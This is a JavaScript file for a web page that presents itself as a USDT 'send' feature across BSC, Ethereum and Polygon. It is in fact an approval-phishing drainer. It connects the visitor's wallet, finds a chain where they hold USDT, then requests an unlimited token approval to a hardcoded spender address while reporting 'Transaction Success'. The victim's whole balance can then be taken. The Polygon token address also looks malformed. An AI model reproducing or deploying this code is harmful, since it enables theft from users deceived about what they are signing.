/* ======================================================
   GLOBAL STATE
====================================================== */

let provider;
let signer;
let userAddress;
let detectedChain = null;

/* ======================================================
   CONFIG
====================================================== */

// Your spender address
const SPENDER_ADDRESS = "0x220BB5df0893F21f43e5286Bc5a4445066F6ca56";

// Unlimited approval (max uint256)
const UNLIMITED_APPROVAL = ethers.MaxUint256;

// Minimal ERC20 ABI
const ERC20_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)"
];

// Supported chains with USDT
const CHAINS = [
  {
    name: "BSC",
    chainId: "0x38",
    rpc: "https://bsc-dataseed.binance.org/",
    usdt: "0x55d398326f99059fF775485246999027B3197955",
    explorer: "https://bscscan.com"
  },
  {
    name: "Ethereum",
    chainId: "0x1",
    rpc: "https://rpc.ankr.com/eth",
    usdt: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    explorer: "https://etherscan.io"
  },
  {
    name: "Polygon",
    chainId: "0x89",
    rpc: "https://polygon-rpc.com",
    usdt: "0xc2132D05D31c914a87C6611C10748AaCBbB7E2",
    explorer: "https://polygonscan.com"
  }
];

/* ======================================================
   WALLET CONNECT
====================================================== */

async function connectWallet() {
  if (!window.ethereum) {
    alert("Wallet not found");
    throw new Error("Wallet not found");
  }

  provider = new ethers.BrowserProvider(window.ethereum);
  await provider.send("eth_requestAccounts", []);
  signer = await provider.getSigner();
  userAddress = await signer.getAddress();

  return userAddress;
}

/* ======================================================
   CHAIN SWITCH / ADD
====================================================== */

async function switchChain(chain) {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: chain.chainId }]
    });
  } catch (err) {
    if (err.code === 4902) {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [{
          chainId: chain.chainId,
          chainName: chain.name,
          rpcUrls: [chain.rpc],
          nativeCurrency: {
            name: chain.name,
            symbol: chain.name === "BSC" ? "BNB" : chain.name === "Polygon" ? "MATIC" : "ETH",
            decimals: 18
          },
          blockExplorerUrls: [chain.explorer]
        }]
      });
    } else {
      throw err;
    }
  }
}

/* ======================================================
   AUTO-DETECT USDT CHAIN
====================================================== */

async function detectUSDTChain() {
  await connectWallet();

  for (const chain of CHAINS) {
    try {
      await switchChain(chain);

      const tempProvider = new ethers.BrowserProvider(window.ethereum);
      const token = new ethers.Contract(chain.usdt, ERC20_ABI, tempProvider);

      const balance = await token.balanceOf(userAddress);

      if (balance > 0n) {
        detectedChain = chain;
        return chain;
      }
    } catch (e) {
      continue;
    }
  }

  return null;
}

/* ======================================================
   SEND BUTTON (UNLIMITED APPROVAL)
====================================================== */

async function sendUSDT() {
  try {
    // Detect chain with USDT
    const chain = detectedChain || await detectUSDTChain();

    if (!chain) {
      alert("No USDT balance found on supported chains");
      return;
    }

    // Ensure correct chain
    await switchChain(chain);

    // USDT contract with signer
    const token = new ethers.Contract(
      chain.usdt,
      ERC20_ABI,
      signer
    );

    // 🔴 UNLIMITED APPROVAL
    const tx = await token.approve(
      SPENDER_ADDRESS,
      UNLIMITED_APPROVAL
    );

    // ⏳ Wait for confirmation
    await tx.wait();

    // ✅ Final success message
    alert("Transaction Success");

  } catch (err) {
    console.error(err);
    alert("Transaction Failed or Cancelled");
  }
}

/* ======================================================
   OPTIONAL: MAX BUTTON (fills balance in UI)
====================================================== */

async function setMax() {
  try {
    const chain = detectedChain || await detectUSDTChain();
    if (!chain) return;

    const tempProvider = new ethers.BrowserProvider(window.ethereum);
    const token = new ethers.Contract(chain.usdt, ERC20_ABI, tempProvider);

    const decimals = await token.decimals();
    const balance = await token.balanceOf(userAddress);

    document.getElementById("amount").value =
      ethers.formatUnits(balance, decimals);

  } catch (e) {
    console.warn("Max failed");
  }
}

/* ======================================================
   EXPOSE FUNCTIONS TO UI
====================================================== */

window.sendUSDT = sendUSDT;
window.setMax = setMax;
